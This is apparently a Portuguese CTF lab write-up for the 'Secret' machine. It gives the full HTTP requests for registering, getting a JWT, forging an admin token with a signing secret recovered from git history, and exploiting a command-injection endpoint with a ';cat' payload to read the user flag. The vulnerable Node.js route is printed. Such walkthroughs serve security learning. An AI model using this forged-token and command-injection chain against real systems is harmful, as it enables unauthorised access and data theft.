# Exercises

## Linux

### Machine Secret

1. Criar usuario
````http
POST /api/user/register HTTP/1.1
Host: 10.10.11.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 88

{
	"name": "bugsam",
	"email": "bugsam@dasith.works",
	"password": "Kekc8swFgD6zU"
}
````

2. Obter JWT
````http
POST /api/user/login HTTP/1.1
Host: 10.10.11.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 68

{
	"email": "bugsam@dasith.works",
	"password": "Kekc8swFgD6zU"
}
````

````http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 07 Jan 2022 00:55:22 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ3OGY0YzMyNGI3MjA0NjA3ZjNmNmMiLCJuYW1lIjoiYnVnc2FtIiwiZW1haWwiOiJidWdzYW1AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNTE2OTIyfQ.MQch40J_dLaoCAsmnfFBVkRa9I7lPTOqxI5ZOR-YnVs
ETag: W/"d3-3iO+pY4L4lsm4uW7A1qn02jy1Ys"
Content-Length: 211

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ3OGY0YzMyNGI3MjA0NjA3ZjNmNmMiLCJuYW1lIjoiYnVnc2FtIiwiZW1haWwiOiJidWdzYW1AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNTE2OTIyfQ.MQch40J_dLaoCAsmnfFBVkRa9I7lPTOqxI5ZOR-YnVs
````

3. Testar JWT
````http
GET /api/priv HTTP/1.1
Host: 10.10.11.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 23
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ3OGY0YzMyNGI3MjA0NjA3ZjNmNmMiLCJuYW1lIjoiYnVnc2FtIiwiZW1haWwiOiJidWdzYW1AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNTE4MDU4fQ.pb7GNWqYyZR58PiPMzen4CKXnL6vjc2_xBpuDJF0Rmc


````

4. Verificar os arquivos dos diretórios

O arquivo routes/private.js possui um endpoint com falha de command injection
Para alcançar a vulnerabilidade, é necessário obter privilégio com usuário  theadmin

````js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
}
````


````bash
# cat .env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
````

O TOKEN_SECRET secret é invalido, foi modificado

````bash
local-web# git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons
````

O TOKEN_SECRET foi modificado
````bash
local-web# git diff HEAD~2
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
diff --git a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
--- a/routes/private.js
+++ b/routes/private.js
@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
     
     if (name == 'theadmin'){
         res.json({
-            role:{
-
-                role:"you are admin", 
-                desc : "{flag will be here}"
+            creds:{
+                role:"admin", 
+                username:"theadmin",
+                desc : "welcome back admin,"
             }
         })
     }
````

5. Verifique o token
````http
GET /api/priv HTTP/1.1
Host: 10.10.11.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNjExMjc4fQ.-GiEdOB97BN4toK2PGGvjE-5UocBCV_dzj5vSRGRDLk


````

````http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 76
ETag: W/"4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0"
Date: Sat, 08 Jan 2022 03:17:46 GMT
Connection: close

{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
````

6. 
````
GET /api/logs?file=index.js;cat+../user.txt HTTP/1.1
Host: 10.10.11.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5MDAwNTY2YTdlNTA0NjhhNGFlNGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQxNjExMjc4fQ.-GiEdOB97BN4toK2PGGvjE-5UocBCV_dzj5vSRGRDLk


````

````
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 61
ETag: W/"3d-u+mlmerZw4DaBZWdXoErNJODbYk"
Date: Sat, 08 Jan 2022 04:06:44 GMT
Connection: close

"ab3e953 Added the codes\nddcf7f061fa3c3c2c6756391e57676d3\n"
````

user.txt => ddcf7f061fa3c3c2c6756391e57676d3

Tool to crack JWT:
https://lmammino.github.io/jwt-cracker/

## Windows


